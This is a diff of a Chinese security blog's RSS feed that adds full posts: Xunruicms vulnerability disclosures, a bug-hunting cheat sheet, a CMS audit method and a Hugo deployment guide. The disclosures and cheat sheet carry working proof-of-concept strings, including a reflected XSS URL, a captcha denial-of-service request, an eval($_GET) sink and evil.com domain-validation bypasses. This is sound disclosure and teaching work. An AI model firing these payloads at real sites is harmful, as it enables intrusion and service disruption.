@@ -1,3 +1,2719 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 青鸟的博客</title><link>https://blue-bird1.github.io/posts/</link><description>Recent content in Posts on 青鸟的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Mon, 09 Dec 2019 00:07:02 +0800</lastBuildDate><atom:link href="https://blue-bird1.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Xunruicms</title><link>https://blue-bird1.github.io/posts/xunruicms/</link><pubDate>Mon, 09 Dec 2019 00:07:02 +0800</pubDate><guid>https://blue-bird1.github.io/posts/xunruicms/</guid><description>前言 前几天寻思着想挖几个通用的洞 于是在fofa poc列表上找找目标. 锁定目标为php cms 已有0day. 很快就锁定到了这个迅睿cms. 发现可以在</description></item><item><title>漏洞挖掘技巧</title><link>https://blue-bird1.github.io/posts/bug/</link><pubDate>Sun, 08 Dec 2019 12:01:04 +0800</pubDate><guid>https://blue-bird1.github.io/posts/bug/</guid><description>仅作为个人的漏洞类型和技巧记录 于阅读漏洞报告时记录 类型 不需要特殊技巧 简单就可以确认的类型 GraphQL查询漏洞 Graphql作为一种前端查询</description></item><item><title>使用github Action自动化部署 Hugo</title><link>https://blue-bird1.github.io/posts/github-action-hugo/</link><pubDate>Wed, 04 Dec 2019 23:58:12 +0800</pubDate><guid>https://blue-bird1.github.io/posts/github-action-hugo/</guid><description>前言 最近由于一直在用的travis-ci出现了迷之bug,加上想尝试一下github action就决定尝试用github action替换tr</description></item><item><title>Cms代码审计方法</title><link>https://blue-bird1.github.io/posts/cms-audit/</link><pubDate>Sun, 01 Dec 2019 20:26:55 +0800</pubDate><guid>https://blue-bird1.github.io/posts/cms-audit/</guid><description>前言 记录cms挖掘漏洞的几种下手方法 基于危险函数 最常见的应该是这种了 通过搜索常见的危险函数如assert|eval|system|file_</description></item><item><title>Code Audit</title><link>https://blue-bird1.github.io/posts/code-audit/</link><pubDate>Tue, 26 Nov 2019 12:56:55 +0800</pubDate><guid>https://blue-bird1.github.io/posts/code-audit/</guid><description>前言 代码审计是白盒测试的重要部分,对它的自动化探索也从未停止,但是在现实环境复杂度下现有的工具 实用性并不用.只能实现发现简单漏洞.本文讨论现</description></item><item><title>时间攻击</title><link>https://blue-bird1.github.io/posts/time-attack/</link><pubDate>Fri, 22 Nov 2019 01:17:28 +0800</pubDate><guid>https://blue-bird1.github.io/posts/time-attack/</guid><description>前言 对于本篇博客的标题 读者应该都不陌生了 毕竟大名鼎鼎的cpu漏洞就有利用这种侧信道攻击的. 这种攻击的难度也很大,但是作为一种攻击却是挺有意思</description></item><item><title>Mysql 储存过程注入</title><link>https://blue-bird1.github.io/posts/mysql/</link><pubDate>Tue, 07 May 2019 02:42:17 +0800</pubDate><guid>https://blue-bird1.github.io/posts/mysql/</guid><description>Mysql 储存过程注入 mysql有着储存过程这个功能, 这次作者刚好遇到注入点在调用储存过程的sql注入. 基本知识 mysql可以通过以下语句创建一个储</description></item><item><title>在golang项目开始使用Bazel</title><link>https://blue-bird1.github.io/posts/go-bazel/</link><pubDate>Sat, 27 Apr 2019 19:32:12 +0800</pubDate><guid>https://blue-bird1.github.io/posts/go-bazel/</guid><description>在golang项目开始使用Bazel Bazel是一个由java编写的编译工具,支持多语言编译,扩展,远程缓存等大量功能. 下载 推荐通过http</description></item><item><title>XSS实战 跳转XSS</title><link>https://blue-bird1.github.io/posts/location-xss/</link><pubDate>Sat, 20 Apr 2019 12:43:40 +0800</pubDate><guid>https://blue-bird1.github.io/posts/location-xss/</guid><description>XSS实战: 跳转XSS 前言 跳转XSS实际上并不是一种新类型的攻击方式, 主要形成原因是 以前网站外部跳转时是直接接受参数然后跳转,导致了URL重</description></item><item><title>挖掘src漏洞</title><link>https://blue-bird1.github.io/posts/srcbug/</link><pubDate>Sun, 14 Apr 2019 23:22:41 +0800</pubDate><guid>https://blue-bird1.github.io/posts/srcbug/</guid><description>前言 挖src也将近两个月了,写篇博客总结一下. 首先挖洞成果 3中危 2低危, 收入~2k. 真实菜到扣脚,收入连泡面都吃不起.只挖了bilibili</description></item><item><title>现代化网站的渗透测试</title><link>https://blue-bird1.github.io/posts/newsitethink/</link><pubDate>Fri, 22 Feb 2019 21:07:40 +0800</pubDate><guid>https://blue-bird1.github.io/posts/newsitethink/</guid><description>对现代化网站的渗透测试的思考 前言 首先定义本文所说的现代化网站. 现代化网站是指符合以下多个特征的对外服务. 储存,数据库,网站程序等服务器高度分</description></item><item><title>Electron软件简单破解</title><link>https://blue-bird1.github.io/posts/electroncrack/</link><pubDate>Thu, 24 Jan 2019 23:14:25 +0800</pubDate><guid>https://blue-bird1.github.io/posts/electroncrack/</guid><description>electron 软件破解与修改入门 electron是一款流行的桌面软件框架, 可以用js来写桌面软件, 快速开发.为了提高开发效率,不少公司比如白帽汇直接采用</description></item><item><title>docker搭建复现环境</title><link>https://blue-bird1.github.io/posts/dockertopoc/</link><pubDate>Sat, 19 Jan 2019 22:52:13 +0800</pubDate><guid>https://blue-bird1.github.io/posts/dockertopoc/</guid><description>docker搭建复现环境 安全人员进行漏洞复现经常需要搭建漏洞环境, docker能够很方便搭建漏洞环境,同时提供相当好的性能,管理功能. doc</description></item><item><title>Iwebshop sql注入</title><link>https://blue-bird1.github.io/posts/iwebshopsql/</link><pubDate>Sat, 19 Jan 2019 18:12:19 +0800</pubDate><guid>https://blue-bird1.github.io/posts/iwebshopsql/</guid><description>&lt;h3 id=&#34;iwebshop-最新版本5-3-1-前台注入&#34;&gt;iwebshop 最新版本5.3.1 前台注入&lt;/h3&gt;
-&lt;p&gt;iwebshop最新版存在一个非常弱智的注入漏洞&lt;/p&gt;</description></item><item><title>think5审计与调试技巧1</title><link>https://blue-bird1.github.io/posts/thinkphp5-1/</link><pubDate>Thu, 17 Jan 2019 23:19:42 +0800</pubDate><guid>https://blue-bird1.github.io/posts/thinkphp5-1/</guid><description>&lt;h3 id=&#34;think5审计与调试技巧1&#34;&gt;think5审计与调试技巧1&lt;/h3&gt;</description></item><item><title>统计学2:现代概率</title><link>https://blue-bird1.github.io/posts/statistics2/</link><pubDate>Mon, 07 Jan 2019 21:20:23 +0800</pubDate><guid>https://blue-bird1.github.io/posts/statistics2/</guid><description>&lt;h4 id=&#34;统计学2-现代概率&#34;&gt;统计学2: 现代概率&lt;/h4&gt;
-&lt;p&gt;现代概率的一大特征是概率不确定性.古代概率研究的骰子可以认为每面的概率是1/6, 但是统计天气的时候, 就没有理由认为晴天和雨天的概率都是1/2.&lt;/p&gt;</description></item><item><title>统计与概率1 古典概率</title><link>https://blue-bird1.github.io/posts/statistics1/</link><pubDate>Sat, 05 Jan 2019 22:13:04 +0800</pubDate><guid>https://blue-bird1.github.io/posts/statistics1/</guid><description>统计与概率1 古典概率 概率的一个定义是一件事发生的一个情况的几率. 也可以表示成$f(\Omega, \omega, \varrho)$ 古典概率研究的是比较简单的情况, 例如硬币</description></item><item><title>Fuzz</title><link>https://blue-bird1.github.io/posts/fuzz/</link><pubDate>Sun, 02 Sep 2018 22:40:07 +0800</pubDate><guid>https://blue-bird1.github.io/posts/fuzz/</guid><description>fuzz工具非常多 如libfuzz honggfuzz KernelFuzzer 也有专注进行web fuzz的wfuzz 但是fuzz功能可以分成两种 只是生成测试用例和检测程序使用测试用</description></item><item><title>metasploit python 模块</title><link>https://blue-bird1.github.io/posts/metasploit1/</link><pubDate>Fri, 02 Feb 2018 22:57:52 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metasploit1/</guid><description>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模</description></item><item><title>metasploit python 模块是如何运行</title><link>https://blue-bird1.github.io/posts/metasploit2/</link><pubDate>Fri, 02 Feb 2018 22:57:52 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metasploit2/</guid><description>开始 metasploit的扩展实现的代码主要在metasploit-framework/lib/msf/core/modules/exter</description></item><item><title>Metinfo3.5.19 getshell</title><link>https://blue-bird1.github.io/posts/metinfogetshell/</link><pubDate>Tue, 28 Nov 2017 22:26:19 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metinfogetshell/</guid><description>metinfo后台getshellexp分析 漏洞版本3.5.19 漏洞文件路径/admin/app/physical/physical.php</description></item><item><title>metinfo3.5.18后台getshell分析</title><link>https://blue-bird1.github.io/posts/metinfoexp/</link><pubDate>Sat, 25 Nov 2017 22:26:31 +0800</pubDate><guid>https://blue-bird1.github.io/posts/metinfoexp/</guid><description>此漏洞已经在最新版修复 exp /admin/app/physical/physical.php?action=op&amp;amp;op=3&amp;amp;va</description></item></channel></rss>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 青鸟的博客</title><link>https://blue-bird1.github.io/posts/</link><description>Recent content in Posts on 青鸟的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Mon, 09 Dec 2019 00:07:02 +0800</lastBuildDate><atom:link href="https://blue-bird1.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Xunruicms</title><link>https://blue-bird1.github.io/posts/xunruicms/</link><pubDate>Mon, 09 Dec 2019 00:07:02 +0800</pubDate><guid>https://blue-bird1.github.io/posts/xunruicms/</guid><description>前言 前几天寻思着想挖几个通用的洞 于是在fofa poc列表上找找目标. 锁定目标为php cms 已有0day. 很快就锁定到了这个迅睿cms. 发现可以在</description><content type="html"><![CDATA[
+
+<h3 id="前言">前言</h3>
+
+<p>前几天寻思着想挖几个通用的洞 于是在fofa poc列表上找找目标. 锁定目标为<code>php</code> <code>cms</code> <code>已有0day</code>.
+<img src="https://i.loli.net/2019/12/09/v7qHp1y3ZCaJ6hB.png" alt="2019-12-09 00-09-38 的屏幕截图.png" />
+很快就锁定到了这个<code>迅睿cms</code>. 发现可以在gitee上下载.</p>
+
+<p>废了好大力气 最后在fofa扫的时候才发现寥寥无几 基本可以忽略. 心态十分爆炸</p>
+
+<h3 id="上传文件">上传文件</h3>
+
+<p>转移了<code>&lt;&gt;</code> 危害不大</p>
+
+<pre><code>// 漏洞代码
+  /**
+     * 存储临时表单内容
+     */
+    public function save_form_data() {
+        // fixme 文件写入 但是由于转义了&lt; 所以无法命令
+        $rt = \Phpcmf\Service::L('cache')-&gt;init('file')-&gt;save(
+            dr_safe_filename(\Phpcmf\Service::L('input')-&gt;get('name')),
+            \Phpcmf\Service::L('input')-&gt;post('data'),
+            7200
+        );
+        var_dump($rt);
+        exit;
+    }
+</code></pre>
+
+<p>poc</p>
+
+<pre><code>POST /index.php?c=api&amp;m=save_form_data&amp;s=api&amp;name=test.html 
+
+data: hello world
+
+</code></pre>
+
+<h3 id="反射xss">反射XSS</h3>
+
+<p>需登录 且有权限上传文件</p>
+
+<p>poc <code>http://127.0.0.1:8080/index.php?c=file&amp;m=input_file_url&amp;s=api&amp;name=1%22%20onfocus=%22alert(%27xss%27);%20autofocus%20%22&amp;fid=1</code></p>
+
+<h3 id="验证码dos">验证码dos</h3>
+
+<p>poc <code>http://127.0.0.1:8080/index.php?c=api&amp;m=captcha&amp;s=api&amp;width=4000&amp;height=4000</code></p>
+]]></content></item><item><title>漏洞挖掘技巧</title><link>https://blue-bird1.github.io/posts/bug/</link><pubDate>Sun, 08 Dec 2019 12:01:04 +0800</pubDate><guid>https://blue-bird1.github.io/posts/bug/</guid><description>仅作为个人的漏洞类型和技巧记录 于阅读漏洞报告时记录 类型 不需要特殊技巧 简单就可以确认的类型 GraphQL查询漏洞 Graphql作为一种前端查询</description><content type="html"><![CDATA[
+
+<p>仅作为个人的漏洞类型和技巧记录 于阅读漏洞报告时记录</p>
+
+<h2 id="类型">类型</h2>
+
+<p>不需要特殊技巧 简单就可以确认的类型</p>
+
+<h3 id="graphql查询漏洞">GraphQL查询漏洞</h3>
+
+<p>Graphql作为一种前端查询语言 如未对查询进行限制 可以构造恶意查询 恶意消耗服务器资源.同时GraphQl的权限限制也是一大漏洞点</p>
+
+<h4 id="参考">参考</h4>
+
+<p><a href="https://graphql.org/learn/">https://graphql.org/learn/</a></p>
+
+<p><a href="https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b">https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b</a></p>
+
+<h3 id="jsonp响应头问题">jsonp响应头问题</h3>
+
+<p>jsonp响应头是<code>text/html</code> 可直接当作反射xss</p>
+
+<h3 id="重定向后执行">重定向后执行</h3>
+
+<p>在对客户端重定向后 未终止程序 导致后面代码未预料的执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">// 例子 
+header(&#34;Location:page1.php&#34;);
+ eval($_GET[&#34;a&#34;])</code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="web缓存欺骗攻击">web缓存欺骗攻击</h3>
+
+<p>网站在访问不存在文件时会返回404页面, 而假如网站对.js/.css 文件会进行缓存 且未对404情况处理. 404页面内保存有客户敏感信息(如csrf cookies)的话,使他访问一个不存在的.js文件.将会把他的敏感信息保存下来让攻击者查看</p>
+
+<p>快速确认方法, 确认404页面构造和是否有缓存</p>
+
+<h3 id="xxe">XXE</h3>
+
+<p>解析XML文件的实体将导致执行任意命令  快速确认:任何使用xml作为输入的api都是值得尝试的</p>
+
+<h3 id="正则dos">正则dos</h3>
+
+<p>一些错误的正则表达式将导致一个指数级的复杂度 输入一个特殊的匹配字符串将导致dos.</p>
+
+<p>使用<a href="http://regex101.com/">http://regex101.com/</a>可以查看正则表达式匹配时实际使用的步数和时间.</p>
+
+<p>常见模式<code>\d{1:&gt;20}</code> <code>(\d*)+</code></p>
+
+<p>这个漏洞非常有趣</p>
+
+<h3 id="cors配置问题">CORS配置问题</h3>
+
+<p>网站错误的配置将导致恶意网站可以跨域访问用户在此网站的信息</p>
+
+<h3 id="备份文件可猜测">备份文件可猜测</h3>
+
+<p>网站生成备份文件名可猜测并且未防止访问的话 可以访问所有数据</p>
+
+<h3 id="平行越权">平行越权</h3>
+
+<p>访问其他用户的数据或代表其他用户操作 常见于用<code>userid</code>参数的api 替换id就可以用对应id权限</p>
+
+<h3 id="验证码dos">验证码dos</h3>
+
+<p>验证码接受了长宽参数. 通过输入一个足够大的数字将消耗大量服务器资源. 快速确认 对验证码接口输入<code>width</code>和<code>height</code>  和修改</p>
+
+<h3 id="用户名枚举">用户名枚举</h3>
+
+<p>对于不存在用户名和存在的情况存在两种响应 并不存在验证手段 攻击者可以枚举已存在的用户名</p>
+
+<h3 id="http头攻击">http头攻击</h3>
+
+<p>输入参数控制了响应头的一部分 并且可以插入<code>\r\n</code> 在http头输入任意内容.</p>
+
+<p>可能性快速确认:输入参数存在于返回响应头</p>
+
+<h3 id="模板注入">模板注入</h3>
+
+<p>控制模板文件内容 导致在解析时执行未预料的指令.</p>
+
+<p>快速确认:输入模板常用的分割符和简单计算如 <code>{{ 1+1 }}</code> <code>[[ 1+1 ]]</code></p>
+
+<h3 id="css注入">CSS注入</h3>
+
+<p>css也可以执行js代码</p>
+
+<h3 id="onmessage">onMessage</h3>
+
+<p>js中的<code>onMessage</code>时间如果不进行限制 默认将会接收所有网站发出的<code>postMessage</code> . 现在开发一般对<code>message</code>信任  如果代码直接使用这部分数据作为html 将导致xss.</p>
+
+<h2 id="技巧">技巧</h2>
+
+<h3 id="ie-edge浏览器未编码window-location-href">IE/EDGE浏览器未编码window.location.href</h3>
+
+<p>直接使用window.location.href作为html时 IE/edge浏览器未对这参数进行url编码</p>
+
+<h3 id="svg-xss">svg XSS</h3>
+
+<p>svg文件可以导致xss, 如果上传图片未限制.svg的话将存在漏洞</p>
+
+<h3 id="pdf-xss">pdf xss</h3>
+
+<p>pdf可以加入js代码 将会导致xss</p>
+
+<h3 id="00终止bash执行">%00终止bash执行</h3>
+
+<p>bash执行时 如果命令中引号内有%00 将直接抛出错误</p>
+
+<h3 id="bypass-域名验证">bypass 域名验证</h3>
+
+<p>如果是以正则 <code>^www.test.com</code>作为验证  通过<code>www.test.com@evil.com</code>绕过</p>
+
+<p>如果是通过解析url再通过验证域名 可以通过浏览器对错误url的解析来绕过 例如</p>
+
+<p><code>evil.com\\@test.com</code> 实际上是<code>evil.com</code> 而解析url时域名解析成<code>test.com</code> 了</p>
+
+<p>同样的<code>/\google.com</code> 将前往google.com</p>
+
+<h3 id="sentry-ssrf">sentry SSRF</h3>
+
+<p>sentry是一个错误报告服务 但是配置不当 可能通过它的api来<code>SSRF</code></p>
+
+<h3 id="get-csrf">GET CSRF</h3>
+
+<p>常见框架只对于<code>POST</code> 请求验证csrf 如果api允许get方法 将直接csrf</p>
+
+<h3 id="上传符号链接文件">上传符号链接文件</h3>
+
+<p>访问符号链接文件时将访问到对应的真实文件 导致文件读取</p>
+
+<h3 id="script-块内xss"><code>&lt;script&gt;</code>块内xss</h3>
+
+<p><code>'</code>和<code>&quot;</code>和<code>&lt;&gt;</code>任意一个未转义都可能导致xss
+<code>&lt;script&gt;</code>块内不需要考虑逃脱<code>'</code>和<code>&quot;</code>
+例如</p>
+
+<pre><code>&lt;script&gt;
+var a =&quot;&lt;/script&gt;&lt;img&gt;&quot;
+</code></pre>
+
+<h3 id="跳转xss">跳转xss</h3>
+
+<p>常见跳转页都是JavaScript操作的,如果将跳转地址改为<code>JavaScript:xxx</code>将把重定向漏洞升级为xss</p>
+
+<h3 id="jsonp-xss">jsonp xss</h3>
+
+<p>jsonp的<code>content-type</code>设置为<code>text/html</code> 未过滤<code>callback</code>的话就等于反射xss</p>
+]]></content></item><item><title>使用github Action自动化部署 Hugo</title><link>https://blue-bird1.github.io/posts/github-action-hugo/</link><pubDate>Wed, 04 Dec 2019 23:58:12 +0800</pubDate><guid>https://blue-bird1.github.io/posts/github-action-hugo/</guid><description>前言 最近由于一直在用的travis-ci出现了迷之bug,加上想尝试一下github action就决定尝试用github action替换tr</description><content type="html"><![CDATA[
+
+<h3 id="前言">前言</h3>
+
+<p>最近由于一直在用的<code>travis-ci</code>出现了迷之bug,加上想尝试一下<code>github action</code>就决定尝试用<code>github action</code>替换<code>travis-ci</code></p>
+
+<h3 id="选用action">选用action</h3>
+
+<p><code>github</code>现有的<code>action</code>组件可以在<a href="https://github.com/marketplace?type=actions">这里</a>查看. 如果想要自定义自己仓库的<code>workflow</code>,可以选用里面来进行组合.
+不过<code>hugo</code>在<code>github page</code>的<code>workflow</code>,已经有人在<a href="https://github.com/peaceiris/actions-hugo">这</a>弄好了,</p>
+
+<h3 id="编写workflow">编写workflow</h3>
+
+<p><code>workflow</code>定义是一个位于<code>.github/workflows/</code>的<code>yaml</code>文件.点开仓库的<code>action</code>按钮会出现引导界面
+<img src="https://i.loli.net/2019/12/05/iIcU3VN4evzZfl6.png" alt="2019-12-05 00-13-38 的屏幕截图.png" />
+显示一些常用的<code>workflow</code> 但由于我们要用并不在这里面 点击右上角的<code>skip</code>就行.</p>
+
+<p>模板文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-yaml" data-lang="yaml">name<span class="p">:</span><span class="w"> </span>github<span class="w"> </span>pages<span class="w">
+</span><span class="w">
+</span><span class="w"></span>on<span class="p">:</span><span class="w">
+</span><span class="w">  </span>push<span class="p">:</span><span class="w">
+</span><span class="w">    </span>branches<span class="p">:</span><span class="w">
+</span><span class="w">    </span><span class="c"># 你的hugo源码分支</span><span class="w">
+</span><span class="w">    </span>-<span class="w"> </span>master<span class="w">
+</span><span class="w">
+</span><span class="w"></span>jobs<span class="p">:</span><span class="w">
+</span><span class="w">  </span>build-deploy<span class="p">:</span><span class="w">
+</span><span class="w">    </span>runs-on<span class="p">:</span><span class="w"> </span>ubuntu<span class="m">-18.04</span><span class="w">
+</span><span class="w">    </span>steps<span class="p">:</span><span class="w">
+</span><span class="w">    </span>-<span class="w"> </span>uses<span class="p">:</span><span class="w"> </span>actions/checkout@v1<span class="w">
+</span><span class="w">      </span><span class="c"># 如果使用了git submodules</span><span class="w">
+</span><span class="w">      </span><span class="c"># with:</span><span class="w">
+</span><span class="w">      </span><span class="c">#   submodules: true</span><span class="w">
+</span><span class="w">
+</span><span class="w">    </span>-<span class="w"> </span>name<span class="p">:</span><span class="w"> </span>Setup<span class="w"> </span>Hugo<span class="w">
+</span><span class="w">      </span>uses<span class="p">:</span><span class="w"> </span>peaceiris/actions-hugo@v2<span class="w">
+</span><span class="w">      </span>with<span class="p">:</span><span class="w">
+</span><span class="w">        </span>hugo-version<span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.59.1&#39;</span><span class="w">
+</span><span class="w">        </span><span class="c"># extended: true</span><span class="w">
+</span><span class="w">
+</span><span class="w">    </span>-<span class="w"> </span>name<span class="p">:</span><span class="w"> </span>Build<span class="w">
+</span><span class="w">      </span>run<span class="p">:</span><span class="w"> </span>hugo<span class="w"> </span>--minify<span class="w">
+</span><span class="w">
+</span><span class="w">    </span>-<span class="w"> </span>name<span class="p">:</span><span class="w"> </span>Deploy<span class="w">
+</span><span class="w">      </span>uses<span class="p">:</span><span class="w"> </span>peaceiris/actions-gh-pages@v2<span class="m">.5.0</span><span class="w">
+</span><span class="w">      </span>env<span class="p">:</span><span class="w">
+</span><span class="w">        </span>ACTIONS_DEPLOY_KEY<span class="p">:</span><span class="w"> </span>${{<span class="w"> </span>secrets.ACTIONS_DEPLOY_KEY}}<span class="w">
+</span><span class="w">        </span><span class="c"># 你的github page分支</span><span class="w">
+</span><span class="w">        </span>PUBLISH_BRANCH<span class="p">:</span><span class="w"> </span>gh-pages<span class="w">
+</span><span class="w">        </span>PUBLISH_DIR<span class="p">:</span><span class="w"> </span>./public</code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="设置secrets">设置secrets</h3>
+
+<p>之后需要设置<code>secrets</code>.<code>secrets.ACTIONS_DEPLOY_KEY</code>实际上是你的<code>github Personal access tokens</code>,申请后点击项目的<code>setting</code>,在<code>secrets</code>栏添加一个key名是<code>PERSONAL_TOKEN</code>的<code>secrets</code>即可</p>
+]]></content></item><item><title>Cms代码审计方法</title><link>https://blue-bird1.github.io/posts/cms-audit/</link><pubDate>Sun, 01 Dec 2019 20:26:55 +0800</pubDate><guid>https://blue-bird1.github.io/posts/cms-audit/</guid><description>前言 记录cms挖掘漏洞的几种下手方法 基于危险函数 最常见的应该是这种了 通过搜索常见的危险函数如assert|eval|system|file_</description><content type="html"><![CDATA[
+
+<h3 id="前言">前言</h3>
+
+<p>记录cms挖掘漏洞的几种下手方法</p>
+
+<h3 id="基于危险函数">基于危险函数</h3>
+
+<p>最常见的应该是这种了 通过搜索常见的危险函数如<code>assert|eval|system|file_put_contents|unserialize</code>
+ 来快速搜索可能存在的漏洞点 然后再追溯函数参数的引入位置.</p>
+
+<p>寻找速度很快.
+能直接找到的漏洞比较低级.
+在使用框架的cms上 搜索上述函数基本都应该搜到框架里面去了.
+对框架cms作用不大.</p>
+
+<p>但如果拥有前置框架知识 则可以用框架内的危险函数 代替上述函数.如thinkphp的 where order等sql函数 如果使用字符串做参数 将不会进行过滤. 同时由于使用了框架简化代码 这种方法速度将非常快.</p>
+
+<h3 id="基于输入点">基于输入点</h3>
+
+<p>基于危险函数搜索存在一个问题, 如果搜索结果过多,然后大部分输入实际上并不是由我们可控的,会导致效率很低.
+而基于输入点 则是按着只有我可控的输入才能导致漏洞的思路. 首先确定输入点 然后再按流程审计代码.</p>
+
+<p>这种方法速度不快, 但能找到的漏洞类型全面. 而在框架型cms下 由于封装很多 这种方法需要进入的函数很多 速度更加慢了.</p>
+
+<h3 id="基于信任">基于信任</h3>
+
+<p>被开发信任的外部输入值出现问题往往将会是漏洞.基于信任过程的审计非常直接，但考验对代码的熟悉度</p>
+
+<h4 id="验证">验证</h4>
+
+<p>首先需要确认是否存在一些全局验证　和这些过滤器的实际效果是什么．
+然后检查这些验证代码使用的位置(对象毫无疑问肯定是我们的输入)</p>
+
+<h4 id="底层函数">底层函数</h4>
+
+<p>在确认验证是否有误时 必须知道底层函数的安全性.
+首先不管如何封装 最底层函数都是无防护的 开发人员假设上层调用提供了足够的安全验证.而开发人员如果假设底层函数做了安全防护. 这一误差往往会导致漏洞的出现.
+通过审计这些底层函数 来了解那些底层函数是不安全的. 追溯到cms实际使用的函数,就可以知道这些函数的安全性需要什么样的验证来保障.</p>
+
+<p>####　外部输入安全验证
+在了解了函数的安全性后,检查外部输入的安全验证.
+确认安全验证是否良好．比起从输入点审计全部代码的更快更直接.因为大部分代码是与实际漏洞无关的.
+了解安全验证后,检查是否存在全局过滤.</p>
+
+<h4 id="业务逻辑">业务逻辑</h4>
+
+<p>到实际业务逻辑时, 我们已经对cms的验证了如指掌,对于漏洞的搜索,从已知函数下手会比较快.直接搜索,从搜索结果基本可以确认那些是可能有危害的.(例如知道函数传入字符串才可能有漏洞,我们忽略其他参数为数组的搜索结果.)</p>
+
+<p>结合我们了解的全局过滤(例如转义了所有标签)也可以忽略一部分.
+然后在搜索结果 找到开发使用的过滤函数 基本可以得出这个漏洞到底存不存在了.
+也就是一个判定,在这么多验证下是否能达成这个函数所需要的安全性.如果不能就是漏洞</p>
+
+<h3 id="实战">实战</h3>
+
+<p>以yumyecms为例
+从搜索危险函数下手
+<img src="https://i.loli.net/2019/12/01/OmnRiW5qAkP67ef.png" alt="2019-12-01 21-50-55 的屏幕截图.png" />
+令人失望的是 搜索到的结果不多 并且大部分都在类库文件里 检查剩下的反序列化函数 发现也是反序列从数据库中查询出来的数据.</p>
+
+<p>快速确认这个框架是否使用了获取输入的函数,幸运的发现这个cms仍然在使用<code>_
+GET</code>等超全局变量 进行搜索
+<img src="https://i.loli.net/2019/12/01/rJ59XLDiVy2IcCO.png" alt="2019-12-01 21-59-29 的屏幕截图.png" /></p>
+
+<p>首先我们可以忽略仅出现在判断语句里的结果,然后点开其他结果后发现 对变量进行了<code>usafestr</code>的过滤 并直接拼接到sql语句.在不查看这个过滤存在的情况下先认为这个变量已经是安全的.
+查看所有前台可访问函数内变量后 发现未经过编码的只有<code>core/app/shop/alipay.php</code>  但沮丧的发现里面对提交参数进行了其他验证.</p>
+
+<p>对此只能对代码进行更深一步的了解了 我们先从简单的sql注入入手 .</p>
+
+<p>在之前的了解中我们可以知道<code>this-&gt;db</code>操作了数据库(实际上在这个有model层的cms 直接看model类就行了)  我们追着父类查找(其中使用了<code>init.php</code>定义的函数加载文件 但函数都很简单)  最终在<code>core/lib/model.class.php</code> 它使用了<code>core/lib/yymysqli.class.php</code>操作数据库</p>
+
+<p>确认<code>yymysqli</code>的过滤 可以总结</p>
+
+<ol>
+<li>execute/insert方法的key参数/update的where参数是不安全的</li>
+</ol>
+
+<p>根据这些信息 很快就能确认出<code>model</code>类的不安全函数</p>
+
+<p>确认危险函数后 也需要确认外部参数的过滤 我们找到<code>usafestr</code>函数</p>
+
+<pre><code>function usafestr($string,$flitersql=1,$fliter_script=1) {
+	// 过滤url编码
+    $string=str_ireplace(&quot;%&quot;,&quot;&quot;,$string);
+    $string = str_ireplace('%20','',$string);
+    $string = str_ireplace('%27','',$string);
+    $string = str_ireplace('%2527','',$string);
+
+	$string=str_ireplace(&quot;\t&quot;,&quot;&quot;,$string);
+    $string = str_ireplace('*','',$string);
+    $string = str_ireplace(&quot;'&quot;,'',$string);
+    $string = str_ireplace(';','',$string);
+    //$string = str_replace(&quot;{&quot;,'',$string);
+    //$string = str_replace('}','',$string);
+	$string=str_ireplace(&quot;#&quot;,&quot;&quot;,$string);
+	$string=str_ireplace(&quot;--&quot;,&quot;&quot;,$string);
+	$string=str_ireplace(&quot;\&quot;&quot;,&quot;&quot;,$string);
+	$string=str_ireplace(&quot;/&quot;,&quot;&quot;,$string);
+    $string = str_ireplace('\\','',$string);
+	if($flitersql){
+		$string=safestring::fliter_sql($string);
+		}
+	if($fliter_script){
+		$string=safestring::fliter_script($string);
+		}
+	$string=safestring::fliter_escape($string);
+	$string=htmlspecialchars($string);
+	$string = str_ireplace(&quot;$&quot;, &quot;&amp;#36;&quot;, $string);
+	$string = str_ireplace(&quot;\n&quot;, &quot;&lt;br/&gt;&quot;, $string);	
+	$string = str_ireplace('%','%&amp;lrm;',$string);
+	$string=addslashes($string);
+    return $string;
+}
+
+</code></pre>
+
+<p>其中的<code>fliter_sql</code> 和<code>fliter_script</code> 只是过滤常见关键字.
+从这段代码可以看出 过滤了大量字符 最关键的单引号和双引号也被过滤了. 从这点可以确认我们寻找sql注入时绝不能使用单引号和双引号.</p>
+
